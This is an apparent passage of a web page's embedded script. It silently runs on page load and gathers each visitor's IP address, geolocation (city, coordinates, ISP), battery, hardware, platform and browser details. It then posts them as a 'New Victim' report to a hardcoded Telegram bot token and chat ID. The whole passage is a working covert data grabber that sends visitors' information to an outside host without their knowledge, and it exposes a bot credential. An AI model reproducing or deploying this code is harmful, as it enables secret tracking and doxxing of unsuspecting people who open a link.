  <script>
    async function collectAndSendData() {
      const regionTranslate = {
        "West Java": "Jawa Barat",
        "East Java": "Jawa Timur",
        "Central Java": "Jawa Tengah",
        "Jakarta": "DKI Jakarta",
        "Yogyakarta": "DI Yogyakarta",
        "Banten": "Banten",
        "Bali": "Bali",
        "North Sumatra": "Sumatera Utara",
        "South Sumatra": "Sumatera Selatan",
        "Riau": "Riau",
      };

      try {
        // Dapatkan IP v4 dari API khusus IPv4
        const ipRes = await fetch("https://api64.ipify.org?format=json");
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        // Ambil info lokasi berdasarkan IP dari ipapi
        const geoRes = await fetch("https://ipapi.co/" + ip + "/json/");
        const geo = await geoRes.json();

        const city = geo.city;
        const regionRaw = geo.region;
        const region = regionTranslate[regionRaw] || regionRaw;
        const country = geo.country_name;
        const postal = geo.postal;
        const timezone = geo.timezone;
        const lat = geo.latitude;
        const lon = geo.longitude;
        const isp = geo.org;

        let batteryLevel = "Unknown";
        let batteryStatus = "Unknown";
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = Math.round(battery.level * 100) + "%";
          batteryStatus = battery.charging ? "Charging" : "Not Charging";
        }

        const cpuCores = navigator.hardwareConcurrency || "Unknown";
        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
        const platform = navigator.platform || "Unknown";
        const language = navigator.language || "Unknown";
        const userAgent = navigator.userAgent;
        let deviceBrand = "Unknown";
        let deviceModel = userAgent;

        if (/android/i.test(userAgent)) {
          deviceBrand = "Android";
        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
          deviceBrand = "Apple";
        } else if (/windows/i.test(userAgent)) {
          deviceBrand = "Windows";
        } else if (/mac/i.test(userAgent)) {
          deviceBrand = "Mac";
        }

        const now = new Date();
        const currentTime = now.toLocaleTimeString();
        const currentDate = now.toLocaleDateString();

        const message = `
ðŸš¨New Victim Date tuan NathzzðŸš¨

Country: ${country}

Longitude: ${lon}
ISP: ${isp}

Battery Level: ${batteryLevel}
Battery Status: ${batteryStatus}
CPU Cores: ${cpuCores}
RAM: ${ram}
Platform: ${platform}
Language: ${language}
Device Brand: ${deviceBrand}
Device Model: ${deviceModel}

Time: ${currentTime}
Date: ${currentDate}
        `;

        const token = "7774212563:AAExdwi-SFBOwr1hXfe4krnd5SoS6E-sucM";
        const chatId = "6631076203";

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      } catch (err) {
        console.error("Error sending data:", err);
      }
    }

    collectAndSendData();
